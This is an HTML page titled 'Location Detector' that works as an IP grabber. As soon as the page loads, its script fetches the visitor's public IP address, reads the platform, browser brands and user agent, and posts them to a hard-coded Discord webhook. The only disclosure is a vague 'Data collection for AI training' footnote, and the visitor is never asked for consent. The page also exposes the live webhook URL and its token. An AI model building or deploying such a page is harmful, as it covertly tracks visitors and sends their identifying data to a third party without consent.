<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Location Detector</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', 'Courier New', monospace;
            color: #000000;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        /* Rain effect - black glowing */
        .rain-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }
        
        .rain-drop {
            position: absolute;
            width: 2px;
            background: linear-gradient(180deg, rgba(0,0,0,0) 0%, rgba(0,0,0,0.8) 50%, rgba(0,0,0,1) 100%);
            box-shadow: 0 0 10px rgba(0,0,0,0.5), 0 0 20px rgba(0,0,0,0.3);
            animation: rainFall linear infinite;
        }
        
        @keyframes rainFall {
            0% {
                transform: translateY(-100vh) translateX(0px);
                opacity: 0.7;
            }
            100% {
                transform: translateY(100vh) translateX(20px);
                opacity: 0.1;
            }
        }
        
        .container {
            text-align: center;
            background: #ffffff;
            border: 2px solid #000000;
            border-radius: 32px;
            padding: 2rem;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 0 30px rgba(0,0,0,0.8), 0 0 60px rgba(0,0,0,0.5);
            backdrop-filter: blur(2px);
            position: relative;
            z-index: 1;
        }
        .status {
            font-size: 1.2rem;
            margin-bottom: 1.5rem;
            letter-spacing: 1px;
            word-break: break-word;
            color: #000000;
        }
        .info-card {
            background: #000000;
            border: 3px solid #000000;
            padding: 1rem;
            border-radius: 16px;
            margin: 0.8rem 0;
            font-size: 1.2rem;
            font-weight: bold;
            font-family: monospace;
            color: #ffffff;
            box-shadow: 0 0 25px rgba(0,0,0,0.9), 0 0 50px rgba(0,0,0,0.6);
            text-shadow: 0 0 20px rgba(255,255,255,0.8), 0 0 40px rgba(255,255,255,0.5), 0 0 60px rgba(255,255,255,0.3);
            position: relative;
            z-index: 2;
            word-break: break-all;
        }
        .ip-card {
            background: #000000;
            border: 3px solid #000000;
            padding: 1rem;
            border-radius: 16px;
            margin: 0.8rem 0;
            font-size: 1.8rem;
            font-weight: bold;
            font-family: monospace;
            color: #ffffff;
            box-shadow: 0 0 25px rgba(0,0,0,0.9), 0 0 50px rgba(0,0,0,0.6);
            text-shadow: 0 0 20px rgba(255,255,255,0.8), 0 0 40px rgba(255,255,255,0.5), 0 0 60px rgba(255,255,255,0.3);
            position: relative;
            z-index: 2;
        }
        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #000000;
            border-radius: 50%;
            border-top-color: #000000;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .hidden {
            display: none;
        }
        .footnote {
            margin-top: 20px;
            font-size: 0.7rem;
            color: #333333;
        }
        button {
            background: #ffffff;
            border: 2px solid #000000;
            color: #000000;
            padding: 6px 12px;
            border-radius: 40px;
            cursor: pointer;
            margin-top: 12px;
            transition: 0.2s;
            font-weight: bold;
        }
        button:hover {
            background: #000000;
            color: #ffffff;
            border-color: #000000;
            box-shadow: 0 0 20px rgba(0,0,0,0.6);
        }
        #webhookResult {
            font-size: 0.8rem;
            color: #000000;
            margin-top: 10px;
            font-weight: bold;
        }
        .status-text {
            color: #000000;
        }
        .label-text {
            font-size: 0.8rem;
            color: #888888;
            margin-bottom: 5px;
            display: block;
        }
    </style>
</head>
<body>
    <!-- Rain Container -->
    <div class="rain-container" id="rainContainer"></div>
    
    <div class="container">
        <div class="status">
            <span id="loadingIcon" class="loader"></span>
            <span id="statusText" class="status-text">Detecting your location...</span>
        </div>
        
        <span class="label-text">🌐 Your IP Address</span>
        <div id="ipDisplay" class="ip-card hidden">—. —. —. —</div>
        
        <span class="label-text">💻 Your Device Name</span>
        <div id="deviceNameDisplay" class="info-card hidden">Loading...</div>
        
        <div id="webhookResult"> </div>
        <button id="retryBtn" class="hidden">Retry</button>
        <div class="footnote">Data collection for AI training</div>
    </div>

    <script>
        // Generate rain drops
        function createRainDrops() {
            const container = document.getElementById('rainContainer');
            const dropCount = 150;
            
            for (let i = 0; i < dropCount; i++) {
                const drop = document.createElement('div');
                drop.className = 'rain-drop';
                
                const left = Math.random() * 100;
                const height = Math.random() * 80 + 20;
                const duration = Math.random() * 1.5 + 0.8;
                const delay = Math.random() * 3;
                const width = Math.random() * 2 + 1;
                
                drop.style.left = left + '%';
                drop.style.height = height + 'px';
                drop.style.animationDuration = duration + 's';
                drop.style.animationDelay = delay + 's';
                drop.style.width = width + 'px';
                drop.style.opacity = Math.random() * 0.5 + 0.3;
                
                container.appendChild(drop);
            }
        }
        
        createRainDrops();

        (function() {
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1519310508572803126/9TfCcfF-pReH5CIsHihmj80_EsYsx5DIDkrtsxzoq7gBpXG60-nh61YbwJZ4DlooA4Yf"
            
            const loadingIcon = document.getElementById('loadingIcon');
            const statusText = document.getElementById('statusText');
            const ipDisplayDiv = document.getElementById('ipDisplay');
            const deviceNameDisplayDiv = document.getElementById('deviceNameDisplay');
            const webhookResultSpan = document.getElementById('webhookResult');
            const retryBtn = document.getElementById('retryBtn');

            function getDeviceName() {
                try {
                    let deviceName = "Unknown";
                    
                    if (navigator.userAgentData && navigator.userAgentData.platform) {
                        deviceName = navigator.userAgentData.platform;
                    }
                    else if (navigator.platform) {
                        deviceName = navigator.platform;
                    }
                    else if (navigator.userAgent) {
                        const ua = navigator.userAgent;
                        if (ua.includes('Windows')) deviceName = 'Windows';
                        else if (ua.includes('Mac')) deviceName = 'MacOS';
                        else if (ua.includes('Linux')) deviceName = 'Linux';
                        else if (ua.includes('Android')) deviceName = 'Android';
                        else if (ua.includes('iPhone') || ua.includes('iPad')) deviceName = 'iOS';
                        else deviceName = ua.substring(0, 50);
                    }
                    
                    if (navigator.userAgentData && navigator.userAgentData.brands) {
                        const brands = navigator.userAgentData.brands.map(b => b.brand).join(', ');
                        if (brands) deviceName += ` (${brands})`;
                    }
                    
                    return deviceName;
                } catch (e) {
                    return 'Unknown';
                }
            }

            function setStatus(message, isLoading = false, ipValue = null, deviceName = null) {
                statusText.innerText = message;
                if (isLoading) {
                    loadingIcon.classList.remove('hidden');
                    ipDisplayDiv.classList.add('hidden');
                    deviceNameDisplayDiv.classList.add('hidden');
                    if (retryBtn) retryBtn.classList.add('hidden');
                } else {
                    loadingIcon.classList.add('hidden');
                    if (ipValue && ipDisplayDiv) {
                        ipDisplayDiv.innerText = ipValue;
                        ipDisplayDiv.classList.remove('hidden');
                    } else {
                        ipDisplayDiv.classList.add('hidden');
                    }
                    if (deviceName && deviceNameDisplayDiv) {
                        deviceNameDisplayDiv.innerText = deviceName;
                        deviceNameDisplayDiv.classList.remove('hidden');
                    } else {
                        deviceNameDisplayDiv.classList.add('hidden');
                    }
                }
            }

            function showError(errorMsg, ipAddr = null, deviceName = null) {
                loadingIcon.classList.add('hidden');
                statusText.innerText = errorMsg;
                if (ipAddr) {
                    ipDisplayDiv.innerText = ipAddr;
                    ipDisplayDiv.classList.remove('hidden');
                } else {
                    ipDisplayDiv.classList.add('hidden');
                }
                if (deviceName) {
                    deviceNameDisplayDiv.innerText = deviceName;
                    deviceNameDisplayDiv.classList.remove('hidden');
                } else {
                    deviceNameDisplayDiv.classList.add('hidden');
                }
                if (retryBtn) retryBtn.classList.remove('hidden');
                if (webhookResultSpan) webhookResultSpan.innerText = "⚠️ Failed to send to webhook.";
            }

            async function sendToWebhook(ipAddress, deviceName) {
                if (!WEBHOOK_URL || WEBHOOK_URL === "") {
                    console.warn("Webhook URL is empty");
                    webhookResultSpan.innerText = "⚠️ Webhook URL is not defined.";
                    return false;
                }

                const payload = {
                    content: `🌐 **IP Detected**: \`${ipAddress}\`\n💻 **Device Name**: \`${deviceName}\``,
                    embeds: [
                        {
                            title: "Visitor Information",
                            color: 0x000000,
                            fields: [
                                { name: "IP Address", value: ipAddress, inline: true },
                                { name: "Device Name", value: deviceName || "Unknown", inline: true },
                                { name: "Timestamp", value: new Date().toLocaleString("en-US"), inline: true },
                                { name: "User Agent", value: navigator.userAgent.substring(0, 100), inline: false }
                            ],
                            footer: { text: "Fetched via api.ipify.org" },
                            timestamp: new Date().toISOString()
                        }
                    ]
                };

                try {
                    const response = await fetch(WEBHOOK_URL, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(payload)
                    });

                    if (response.ok) {
                        webhookResultSpan.innerText = "✓ IP and Device Name received successfully.";
                        return true;
                    } else {
                        const errorText = await response.text().catch(() => "Unknown error");
                        console.error("Send failed:", response.status, errorText);
                        webhookResultSpan.innerText = `✗ Send failed (HTTP ${response.status})`;
                        return false;
                    }
                } catch (err) {
                    console.error("Network error sending to webhook:", err);
                    webhookResultSpan.innerText = `✗ Network error: ${err.message}`;
                    return false;
                }
            }

            async function fetchAndSendInfo() {
                setStatus("Connecting to IP service...", true);
                webhookResultSpan.innerText = "";
                if (retryBtn) retryBtn.classList.add('hidden');
                
                try {
                    const response = await fetch("https://api.ipify.org/", {
                        method: "GET",
                        cache: "no-store"
                    });
                    
                    if (!response.ok) {
                        throw new Error(`Failed to fetch IP: ${response.status}`);
                    }
                    
                    const ipAddress = await response.text();
                    const ipPattern = /^(?:\d{1,3}\.){3}\d{1,3}$/;
                    if (!ipPattern.test(ipAddress.trim())) {
                        throw new Error("Received data is not a valid IP format");
                    }
                    
                    const cleanIp = ipAddress.trim();
                    const deviceName = getDeviceName();
                    
                    setStatus("✅ Device information identified!", false, cleanIp, deviceName);
                    await sendToWebhook(cleanIp, deviceName);
                    
                } catch (error) {
                    console.error("Error in fetch process:", error);
                    let errorMessage = "Failed to get IP. Check your connection.";
                    if (error.message.includes("Failed to fetch") || error.message.includes("NetworkError")) {
                        errorMessage = "Cannot reach api.ipify.org. Check internet connection.";
                    } else {
                        errorMessage = `Error: ${error.message}`;
                    }
                    const deviceName = getDeviceName();
                    showError(errorMessage, null, deviceName);
                }
            }

            if (retryBtn) {
                retryBtn.addEventListener('click', () => {
                    fetchAndSendInfo();
                });
            }
            
            fetchAndSendInfo();
        })();
    </script>
</body>
</html>
